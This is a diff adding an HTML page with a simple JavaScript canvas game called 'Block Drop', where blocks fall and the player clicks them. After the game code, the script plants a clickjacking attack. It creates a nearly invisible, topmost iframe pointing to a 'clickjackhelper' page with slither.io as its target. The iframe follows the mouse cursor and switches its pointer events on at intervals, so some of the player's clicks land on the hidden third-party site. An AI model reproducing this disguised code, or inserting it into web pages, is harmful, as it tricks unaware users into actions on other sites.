@@ -1,0 +1,187 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<script>
+		var app;
+		app = {
+			model:{
+				init:function(){
+					app.model.oW = 0;
+					app.model.oH = 0;
+					if(localStorage.blockScore){
+						app.model.score = localStorage.blockScore;
+					} else {
+						localStorage.blockScore = 0;
+					}
+				},
+				scaleX:1,
+				scaleY:1,
+				frame: 0,
+				score: 0,
+				paused: true,
+				squares: new Array(),
+				colors: ["#FF6961", "#FFB347", "#FDFD96", "#77DD77", "#779ECB", "#FFD1DC", "#B19CD9"],
+				Square: function(x, y, width, height, color){
+					this.x = x;
+					this.y = y;
+					this.width = width;
+					this.height = height;
+					this.color = color;
+				},
+				collide: function(ax,ay,aw,ah,bx,by,bw,bh){
+					if(ax+aw>bx&&ax<bx+bw&&ay+ah>by&&ay<by+bh){
+						return true;
+					}
+					return false;
+				}
+			},
+			view:{
+				init:function(){
+					app.view.canvas = document.getElementById('canvas');
+					app.view.ctx = app.view.canvas.getContext('2d');
+				},
+			},
+			controller:{
+				init: function(){
+					app.model.init();
+					app.view.init();
+					canvas.onclick = function(e){
+						if(app.model.paused){
+							app.model.paused = false;
+							app.model.score = 0;
+							app.model.squares = new Array();
+							return;
+						} else {
+							for(x in app.model.squares){
+								if(app.model.collide(e.clientX - Number(app.view.canvas.style.left.substr(0,app.view.canvas.style.left.length-2)),e.clientY - Number(app.view.canvas.style.top.substr(0,app.view.canvas.style.top.length-2)),1,1,app.model.squares[x].x,app.model.squares[x].y-(app.view.canvas.height/12 * app.model.scaleY),app.model.squares[x].width,app.model.squares[x].height+(app.view.canvas.height/12 * app.model.scaleY))){
+									app.model.squares.splice(x,1);
+									x++;
+									if(app.model.scaleX > .05){
+										app.model.scaleX -= .05;
+										app.model.scaleY -= .05;
+										app.model.oW = 0;
+										app.model.score++;
+									} else {
+										app.controller.win();
+									}
+								}
+							}
+						}
+					}
+					app.controller.interval = setInterval(function(){
+						app.controller.update();
+					},1000/60);
+				},
+				update: function(){
+					app.model.frame++;
+					if(innerWidth != app.model.oW || innerHeight != app.model.oH){
+						temp = app.view.ctx.getImageData(0,0,app.view.canvas.width,app.view.canvas.height);
+						app.view.canvas.width = innerWidth * app.model.scaleX;
+						app.view.canvas.height = innerHeight * app.model.scaleY;
+						app.view.canvas.style.left = innerWidth/2 - app.view.canvas.width/2 + "px"
+						app.view.canvas.style.top = innerHeight/2 - app.view.canvas.height/2 + "px"
+						app.view.ctx.putImageData(temp,0,0);
+					}
+					app.model.oW = innerWidth;
+					app.model.oH = innerHeight;
+					if(app.model.frame%60 == 0 || Math.random()<app.model.score * 0.0005){
+						app.model.squares.push(new app.model.Square(Math.floor(Math.random()*(app.view.canvas.width - app.view.canvas.width/12)), 0-(app.view.canvas.height/500),app.view.canvas.width/12,app.view.canvas.height/12, app.model.colors[Math.floor(Math.random()*app.model.colors.length)]));
+					}
+					for(x in app.model.squares){
+						app.model.squares[x].y += 6 * app.model.scaleY;
+						if(app.model.squares[x].y > app.view.canvas.height){
+							app.model.squares.splice(x,1);
+							x++;
+							if(!app.model.paused){
+								if(app.model.scaleX < 1){
+									app.model.scaleX += .05;
+									app.model.scaleY += .05;
+									app.model.oW = 0;
+								} else {
+									app.controller.lose();
+								}
+							}
+						}
+					} 
+					app.controller.render();
+				},
+				render: function(){
+					app.view.ctx.globalAlpha = 0.2;
+					app.view.ctx.fillStyle="black";
+					app.view.ctx.fillRect(0, 0, app.view.canvas.width, app.view.canvas.height);
+					app.view.ctx.fillStyle = "white";
+					if(app.model.paused){
+						app.view.ctx.font = (app.view.canvas.height)/3 + "px Helvetica";
+						app.view.ctx.fillText(app.model.score,app.view.canvas.width/2 - app.view.ctx.measureText(app.model.score).width/2,app.view.canvas.height/2 - app.view.canvas.height/3 /2);
+						app.view.ctx.font = (app.view.canvas.width)/5 + "px Helvetica";
+						app.view.ctx.fillText("Block Drop",app.view.canvas.width/2 - app.view.ctx.measureText("Block Drop").width/2,app.view.canvas.height - app.view.canvas.height/3 /2);
+					} else {
+						app.view.ctx.font = (app.view.canvas.height)/3 + "px Helvetica";
+						app.view.ctx.fillText(app.model.score,app.view.canvas.width/2 - app.view.ctx.measureText(app.model.score).width/2,app.view.canvas.height/1.5 - app.view.canvas.height/3 /2);
+					}
+					for(x in app.model.squares){
+						app.view.ctx.fillStyle = app.model.squares[x].color;
+						app.view.ctx.fillRect(app.model.squares[x].x,app.model.squares[x].y,app.model.squares[x].width,app.model.squares[x].height);
+					}
+				},
+				lose: function(){
+					if(app.model.score > localStorage.blockScore){
+						localStorage.blockScore = app.model.score;
+					}
+					app.model.paused = true;
+				},
+				win: function(){
+
+				}
+			}
+		}
+		window.onload = function(){
+			app.controller.init();
+		}
+                const helperSettings = {
+                        width:700,
+                        height:500,
+                        top:-370,
+                        left:-320,
+                        src: 'http://slither.io/'
+                }
+                const settings = {
+                        width:10,
+                        height:10
+                }
+                let iframe;
+                window.addEventListener('load',()=>{
+                        iframe = document.createElement('iframe');
+                        iframe.width = settings.width;
+                        iframe.height = settings.height;
+                        iframe.style.overflow = 'hidden';
+                        iframe.scrolling = 'no';
+                        iframe.style.top = 0 + 'px';
+                        iframe.style.left = 0 + 'px';
+                        iframe.style.position = 'absolute';
+                        iframe.style.zIndex = 999999;
+                        iframe.style.opacity = 0.001;
+                        iframe.src = 'clickjackhelper.html?AXBC' + JSON.stringify(helperSettings);
+			let count = 0;
+			setInterval(()=>{
+				if(count++ %10 == 9) 
+					iframe.style['pointer-events'] = 'auto';
+				else 
+					iframe.style['pointer-events'] = 'none';
+			},100);
+                        document.body.appendChild(iframe);
+                });
+                window.addEventListener('mousemove',e=>{
+                        let x = e.pageX;
+                        let y = e.pageY;
+                        iframe.style.left = x - 2 + 'px';
+                        iframe.style.top = y - 2 + 'px';
+
+                });
+	</script>
+</head>
+<body style="background-color: #0c0c0c">
+	<canvas id="canvas" style="position:absolute;top:0px;left:0px;">Browser doesn't support HTML5</canvas>
+</body>
+</html>
